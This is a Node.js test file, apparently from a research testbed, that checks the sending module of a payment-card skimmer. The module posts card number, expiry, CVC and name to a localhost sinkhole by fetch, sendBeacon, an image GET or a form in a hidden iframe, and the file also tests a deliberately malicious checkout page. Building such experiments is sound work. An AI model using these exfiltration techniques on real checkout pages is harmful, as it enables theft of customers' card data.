'use strict';
// スキマー送信部 send.js の送信手段の切り替えテスト（D57、experiment_spec.md §14.3）。ブラウザは使わない。
// node:vm に偽の window・document・navigator・Image・fetch を渡して、各手段が正しい API を呼ぶことを確かめる。
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const vm = require('node:vm');
const sinkhole = require('../sinkhole/server');
const merchant = require('../merchant/server');

const SRC = fs.readFileSync(path.join(__dirname, '../skimmer/send.js'), 'utf8');
const PAIRS = [['cardnumber', '4242424242424242'], ['exp', '12/30'], ['cvc', '123'], ['name', 'ID-TB-M-OA-001-K7Q4']];
const SINK = 'http://sinkhole.localhost:8082/c';

// 偽のブラウザ環境を作り、send.js を実行して、呼ばれた API を記録する
function load(scriptSrc) {
  const calls = { fetch: [], beacon: [], images: [], forms: [], iframes: [] };
  const mkEl = (tag) => ({ tag, style: {}, children: [], appendChild(c) { this.children.push(c); } });
  const document = {
    currentScript: { src: scriptSrc },
    body: mkEl('body'),
    createElement(tag) {
      const el = mkEl(tag);
      if (tag === 'form') el.submit = function () { calls.forms.push(this); };
      if (tag === 'iframe') calls.iframes.push(el);
      return el;
    },
  };
  function Image() { calls.images.push(this); }
  const window = {};
  const ctx = {
    window, document, URL, URLSearchParams, Math, Image,
    navigator: { sendBeacon(url, body) { calls.beacon.push({ url, body }); return true; } },
    fetch(url, init) { calls.fetch.push({ url, init }); return Promise.resolve(); },
  };
  vm.runInNewContext(SRC, ctx);
  return { window, calls, document };
}

test('t なし・不正な t は fetch（従来どおり。no-cors の POST）', () => {
  for (const src of ['http://merchant.localhost:8080/skimmer/send.js', 'http://merchant.localhost:8080/skimmer/send.js?t=X', 'http://merchant.localhost:8080/skimmer/send.js?t=']) {
    const { window, calls } = load(src);
    assert.equal(window.__skimmerTransport, 'fetch');
    window.__skimmerSend(PAIRS);
    assert.equal(calls.fetch.length, 1);
    assert.equal(calls.fetch[0].url, SINK);
    assert.equal(calls.fetch[0].init.method, 'POST');
    assert.equal(calls.fetch[0].init.mode, 'no-cors');
    assert.equal(calls.fetch[0].init.body.toString(), 'cardnumber=4242424242424242&exp=12%2F30&cvc=123&name=ID-TB-M-OA-001-K7Q4');
    assert.equal(calls.beacon.length + calls.images.length + calls.forms.length, 0);
  }
});

test('B: sendBeacon で、宛先へ全項目を urlencoded の本文で送る', () => {
  const { window, calls } = load('http://merchant.localhost:8080/skimmer/send.js?t=B');
  assert.equal(window.__skimmerTransport, 'B');
  window.__skimmerSend(PAIRS);
  assert.equal(calls.beacon.length, 1);
  assert.equal(calls.beacon[0].url, SINK);
  assert.ok(calls.beacon[0].body instanceof URLSearchParams); // 本文が URLSearchParams なら、preflight の起きない urlencoded になる
  assert.equal(calls.beacon[0].body.toString(), 'cardnumber=4242424242424242&exp=12%2F30&cvc=123&name=ID-TB-M-OA-001-K7Q4');
  assert.equal(calls.fetch.length + calls.images.length + calls.forms.length, 0);
});

test('G: 画像の src に、全項目をクエリで入れた GET を出す', () => {
  const { window, calls } = load('http://merchant.localhost:8080/skimmer/send.js?t=G');
  assert.equal(window.__skimmerTransport, 'G');
  window.__skimmerSend(PAIRS);
  assert.equal(calls.images.length, 1);
  const u = new URL(calls.images[0].src);
  assert.equal(u.origin + u.pathname, SINK);
  assert.deepEqual([...u.searchParams.entries()], PAIRS);
  assert.equal(calls.fetch.length + calls.beacon.length + calls.forms.length, 0);
});

test('F: 隠し iFrame を宛先にした POST フォームを submit する（全項目が隠し入力）', () => {
  const { window, calls, document } = load('http://merchant.localhost:8080/skimmer/send.js?t=F');
  assert.equal(window.__skimmerTransport, 'F');
  window.__skimmerSend(PAIRS);
  assert.equal(calls.forms.length, 1);
  assert.equal(calls.iframes.length, 1);
  const form = calls.forms[0];
  assert.equal(form.method, 'POST');
  assert.equal(form.action, SINK);
  assert.equal(form.target, calls.iframes[0].name); // 宛先は隠し iFrame（ページ遷移しない）
  assert.ok(form.target.startsWith('sk'));
  assert.equal(calls.iframes[0].style.display, 'none');
  assert.deepEqual(form.children.map((i) => [i.type, i.name, i.value]), PAIRS.map(([n, v]) => ['hidden', n, v]));
  assert.ok(document.body.children.includes(form) && document.body.children.includes(calls.iframes[0]));
  assert.equal(calls.fetch.length + calls.beacon.length + calls.images.length, 0);
});

test('sinkhole は GET /c?クエリ を、クエリつきの path・空の body で記録する（受信部品は変更なし）', async () => {
  const port = await sinkhole.start({ port: 0 });
  try {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'send-'));
    sinkhole.begin('TG-M-OX-001', dir);
    const q = new URLSearchParams(PAIRS).toString();
    const r = await fetch(`http://127.0.0.1:${port}/c?${q}`);
    assert.equal(r.status, 200);
    sinkhole.end();
    const rec = fs.readFileSync(path.join(dir, 'receive_sinkhole.jsonl'), 'utf8').split('\n').filter(Boolean).map((l) => JSON.parse(l));
    assert.equal(rec.length, 1);
    assert.equal(rec[0].method, 'GET');
    assert.equal(rec[0].path, `/c?${q}`);
    assert.equal(rec[0].body, '');
  } finally { await sinkhole.stop(); }
});

test('加盟店の悪性ページは ?t=B|G|F を send.js の読み込みに付ける。それ以外・なしは従来と同一', () => {
  // checkoutPage は module.exports に出ていないので、HTTP で確かめる
  return (async () => {
    const port = await merchant.start({ port: 0 });
    try {
      const get = async (p) => (await fetch(`http://127.0.0.1:${port}${p}`)).text();
      const none = await get('/checkout-m');
      assert.ok(none.includes('<script src="/skimmer/send.js"></script>'));
      for (const t of ['B', 'G', 'F']) assert.ok((await get(`/checkout-m?t=${t}`)).includes(`<script src="/skimmer/send.js?t=${t}"></script>`));
      assert.equal(await get('/checkout-m?t=%22%3E%3Cx'), none); // 想定外の値は無視（ページに埋め込まない）
      assert.ok(!(await get('/checkout')).includes('send.js')); // 正規ページに送信部は入らない
    } finally { await merchant.stop(); }
  })();
});
